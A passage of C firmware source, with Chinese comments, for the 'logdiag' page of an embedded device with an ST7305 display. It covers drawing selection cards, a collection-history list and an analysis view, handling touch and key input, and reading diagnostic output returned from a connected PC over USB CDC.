        int x1 = cx + 120 - 1, y1 = cy + ch - 1;
        bool running = (s_run == i) || (s_run == CARD_ALL && i < 4 && i >= s_run_all);
        if (s_cards[i].action == 2) {                 /* 历史卡: 反色突出 */
            fill_rect(l, cx, cy, x1, y1, ST7305_COLOR_BLACK);
            ld_zh(l, cx + 10, cy + 12, s_cards[i].name, true);
            if (s_cards[i].l1) ld_mix(l, cx + 10, cy + 40, s_cards[i].l1);
            if (s_cards[i].l2) ld_mix(l, cx + 10, cy + 62, s_cards[i].l2);
            continue;
        }
        draw_rect_outline(l, cx, cy, x1, y1, ST7305_COLOR_BLACK);
        /* ★ 选中环 (linit: "卡片周围添加一圈选中标识"): 内缩 2px 再画一圈 = 双线框, 一眼看出选中谁 */
        if (i == s_sel) {
            draw_rect_outline(l, cx + 2, cy + 2, x1 - 2, y1 - 2, ST7305_COLOR_BLACK);
            draw_rect_outline(l, cx + 3, cy + 3, x1 - 3, y1 - 3, ST7305_COLOR_BLACK);
        }
        /* 正在跑: 标题压黑条反白 (与"选中"区分开) */
        if (running) {
            fill_rect(l, cx + 2, cy + 8, x1 - 2, cy + 28, ST7305_COLOR_BLACK);
            ld_zh(l, cx + 10, cy + 12, s_cards[i].name, true);
        } else {
            ld_zh(l, cx + 10, cy + 12, s_cards[i].name, false);
        }
        if (s_cards[i].l1) ld_mix(l, cx + 10, cy + 40, s_cards[i].l1);
        if (s_cards[i].l2) ld_mix(l, cx + 10, cy + 62, s_cards[i].l2);
        if (s_cards[i].l3) ld_mix(l, cx + 10, cy + 84, s_cards[i].l3);
        /* 右上角状态方块: 实心=本次已采到 */
        int sq = (i < 4) ? ((s_have && (s_run < 0)) ? 1 : 0) : 0;
        if (sq) fill_rect(l, x1 - 16, cy + 14, x1 - 9, cy + 21, ST7305_COLOR_BLACK);
        else    draw_rect_outline(l, x1 - 16, cy + 14, x1 - 9, cy + 21, ST7305_COLOR_BLACK);
    }
}

static void ld_render_hist(st7305_handle_t *l)
{
    ld_zh(l, 16, 10, "\xe9\x87\x87\xe9\x9b\x86\xe5\x8e\x86\xe5\x8f\xb2", false);   /* 采集历史 */
    draw_hline(l, 10, 389, 34, ST7305_COLOR_BLACK);
    if (s_hist_n == 0) {
        ld_zh_center(l, 130, "\xe6\x9a\x82\xe6\x97\xa0\xe8\xae\xb0\xe5\xbd\x95", false);  /* 暂无记录 */
        ld_asc_center(l, 160, "insert TF card, run collect first");
        return;
    }
    for (int i = 0; i < s_hist_n && i < 8; i++) {
        int y = 44 + i * 28;
        bool sel = (i == s_hist_sel);
        if (sel) fill_rect(l, 10, y - 4, 389, y + 22, ST7305_COLOR_BLACK);
        draw_text(l, 16, y, s_hist[i], sel);
    }
}

__attribute__((unused)) static void ld_render_text(st7305_handle_t *l, const char *title)
{
    ld_zh(l, 16, 10, title, false);
    draw_hline(l, 10, 389, 34, ST7305_COLOR_BLACK);
    for (int i = 0; i < s_text_n && i < 9; i++)
        draw_text(l, 16, 44 + i * 24, s_text[i], false);
}

static void ld_render(ui_ctx_t *ctx)
{
    st7305_handle_t *l = ctx->lcd;
    if (!l) return;
    st7305_clear(l, ST7305_COLOR_WHITE);

    if (s_view == 1) {
        ld_render_hist(l);
        ld_bar(l, s_hist_n ? "\xe6\x89\x93\xe5\xbc\x80" : NULL, "\xe8\xbf\x94\xe5\x9b\x9e");  /* 打开 / 返回 */
        return;
    }
    if (s_view == 3) {
        ld_zh(l, 16, 10, "\xe5\x88\x86\xe6\x9e\x90\xe7\xbb\x93\xe8\xae\xba", false);   /* 分析结论 */
        draw_hline(l, 10, 389, 34, ST7305_COLOR_BLACK);
        for (int i = 0; i < s_text_n && i < 9; i++)
            draw_text(l, 16, 44 + i * 24, s_text[i], false);
        ld_bar(l, s_analyzed ? "\xe5\x9B\x9E\xE4\xBC\xA0" : NULL, "\xe8\xbf\x94\xe5\x9b\x9e");  /* 回传 / 返回 */
        return;
    }

    ld_render_cards(l);

    /* 空闲且 HID 没起来 → 提示为什么点了没反应 */
    if (s_run < 0 && !os_hid_is_running()) ld_mix_center(l, 250, "\xe6\x9c\xaa\xe8\xbf\x9e\xe7\x94\xb5\xe8\x84\x91" /* 未连电脑 */);

    /* 采集时: 横线上方两行 (步数时间 + 当前命令) */
    if (s_run >= 0) {
        char a[48];
        uint32_t el = ((uint32_t)(xTaskGetTickCount() * portTICK_PERIOD_MS) - s_start_ms) / 1000;
        if (s_run == RUN_SEND) snprintf(a, sizeof(a), "SEND  rx %d lines - %u s", s_rx_lines, (unsigned)el);
        else                   snprintf(a, sizeof(a), "%d / %d step - %u s", s_prog, s_total, (unsigned)el);
        ld_asc_center(l, 250, a);
        char b[52];
        int n = snprintf(b, sizeof(b), "%s", s_lastcmd);
        if (n > 48) { b[45] = '.'; b[46] = '.'; b[47] = '.'; b[48] = 0; }
        ld_asc_center(l, 264, b);
    }

    /* 底栏: 左软键按状态变, 右软键 开始/取消 */
    const char *left = NULL, *right = "\xe5\xbc\x80\xe5\xa7\x8b";     /* 开始 */
    if (s_run == RUN_SEND) {
        left = NULL;                                                  /* 回传中: 左键留空 */
        right = "\xe5\x8f\x96\xe6\xb6\x88";                           /* 取消 */
    } else if (s_run >= 0) {
        left = "\xe6\x97\xa5\xe5\xbf\x97";                            /* 日志 */
        right = "\xe5\x8f\x96\xe6\xb6\x88";                           /* 取消 */
    } else if (s_analyzed) {
        left = "\xe5\x9b\x9e\xe4\xbc\xa0";                            /* 回传 */
    } else if (s_have) {
        left = "\xe5\x88\x86\xe6\x9e\x90";                            /* 分析 */
    } else {
        left = "\xe5\x85\xa8\xe9\x87\x87";                            /* 全采 (空闲也给个入口, 不空着) */
    }
    ld_bar(l, left, right);
    if (s_run >= 0) ld_progress(l);
}

/* ================= 10. 触摸 / 按键 ================= */
static bool ld_touch(ui_ctx_t *ctx, int x, int y)
{
    /* 底栏两角 = 软键 */
    if (y >= BAR_LID) {
        if (x < 90) {                                    /* 左软键 */
            if (s_view == 1) {                           /* 历史: 打开选中项 */
                char path[96];
                snprintf(path, sizeof(path), LOGDIR "/%s", s_hist[s_hist_sel]);
                FILE *f = fopen(path, "r");
                s_text_n = 0;
                if (f) {
                    char line[64];
                    while (fgets(line, sizeof(line), f) && s_text_n < 9) {
                        size_t n = strlen(line);
                        while (n && (line[n-1] == '\n' || line[n-1] == '\r')) line[--n] = 0;
                        snprintf(s_text[s_text_n++], 44, "%s", line);
                    }
                    fclose(f);
                }
                s_view = 2;
                ctx->needs_redraw = true;
                return true;
            }
            if (s_view == 2 || s_view == 3) { s_view = 0; s_text_pg = 0; ctx->needs_redraw = true; return true; }
            if (s_run < 0 && s_analyzed) ld_backhaul();          /* 分析完 → 回传 */
            else if (s_run < 0 && s_have) ld_analyze();          /* 有结果 → 分析 */
            else if (s_run < 0) ld_start(CARD_ALL);              /* 空闲 → 一键全采 */
            ctx->needs_redraw = true;
            return true;
        }
        if (x > 310) {                                   /* 右软键 */
            if (s_view != 0) { s_view = 0; ctx->needs_redraw = true; return true; }
            if (s_run >= 0) {                                 /* 取消 */
                if (s_task) { vTaskDelete(s_task); s_task = NULL; }
                s_run = -1; s_run_all = 0;
            } else {
                ld_start(s_sel);
            }
            ctx->needs_redraw = true;
            return true;
        }
        return true;
    }
    if (s_view == 1) {                                   /* 历史列表点选 */
        int idx = (y - 40) / 28;
        if (idx >= 0 && idx < s_hist_n) { s_hist_sel = idx; ctx->needs_redraw = true; }
        return true;
    }
    if (s_view != 0) return true;

    /* 卡片命中 */
    for (int i = 0; i < 6; i++) {
        int cx = CARD_X(i % 3), cy = card_y(i / 3);
        if (x >= cx && x < cx + 120 && y >= cy && y < cy + card_h()) {
            s_sel = i;                                    /* 先选中(选中环立刻可见) */
            if (s_run >= 0) return true;                  /* 采集中不响应卡片 */
            if (s_cards[i].action == 2) { ld_hist_scan(); s_hist_sel = 0; s_view = 1; }
            else ld_start(i);
            ctx->needs_redraw = true;
            return true;
        }
    }
    return false;
}

static void ld_action(ui_ctx_t *ctx, os_action_t a)
{
    if (a == OS_ACTION_LEFT || a == OS_ACTION_RIGHT) {
        if (s_view == 1) {
            if (s_hist_n) s_hist_sel = (s_hist_sel + (a == OS_ACTION_RIGHT ? 1 : s_hist_n - 1)) % s_hist_n;
        } else if (s_view == 0) {
            s_sel = (s_sel + (a == OS_ACTION_RIGHT ? 1 : 5)) % 6;
        }
        ctx->needs_redraw = true;
        return;
    }
    if (a == OS_ACTION_CONFIRM) {
        if (s_view == 0 && s_run < 0) ld_start(s_sel);
        ctx->needs_redraw = true;
        return;
    }
    if (a == OS_ACTION_BACK) {
        if (s_view != 0) { s_view = 0; ctx->needs_redraw = true; return; }
        os_request_exit_confirm(ctx);
        return;
    }
}

/* ================= 11. 轮询: 读 CDC 回传 ================= */
static void ld_poll(ui_ctx_t *ctx)
{
    static uint8_t buf[512];
    size_t n = os_hid_cdc_read(buf, sizeof(buf) - 1);
    if (n == 0) return;
    buf[n] = 0;
    /* 首包若带 "=== COMPUTERNAME xxx ===" 就认下电脑名 */
    char *p = strstr((char *)buf, "COMPUTERNAME");
    if (p) {
        p += 12;
        while (*p == ' ') p++;
        int i = 0;
        while (*p && *p != ' ' && *p != '\r' && *p != '\n' && i < 31) s_pcname[i++] = *p++;
        s_pcname[i] = 0;
    }
    ld_hist_append((const char *)buf, (int)n);
    if (s_rx_len + (int)n < (int)sizeof(s_rx) - 1) {
        memcpy(s_rx + s_rx_len, buf, n);
        s_rx_len += (int)n;
        s_rx[s_rx_len] = 0;
    } else if (s_rx_len < (int)sizeof(s_rx) - 1) {
        int room = (int)sizeof(s_rx) - 1 - s_rx_len;
        memcpy(s_rx + s_rx_len, buf, (size_t)room);
        s_rx_len += room;
        s_rx[s_rx_len] = 0;
    }
    for (size_t i = 0; i < n; i++) if (buf[i] == '\n') s_rx_lines++;
    if (s_run < 0) s_have = true;
    ctx->needs_redraw = true;
}

static const os_module_t s_mod_logdiag = {
    .name = "logdiag", .page_id = OS_PAGE_LOGDIAO,
    .on_enter = NULL, .on_exit = NULL,
    .render = ld_render, .action = ld_action, .touch = ld_touch, .poll = ld_poll,
    .fullscreen = true,
    .exit_confirm = true,   /* 返回键先弹"退出程序?"确认 (2026-10-14 全局规范) */
};
void os_page_logdiag_register(void) { os_register(&s_mod_logdiag); }
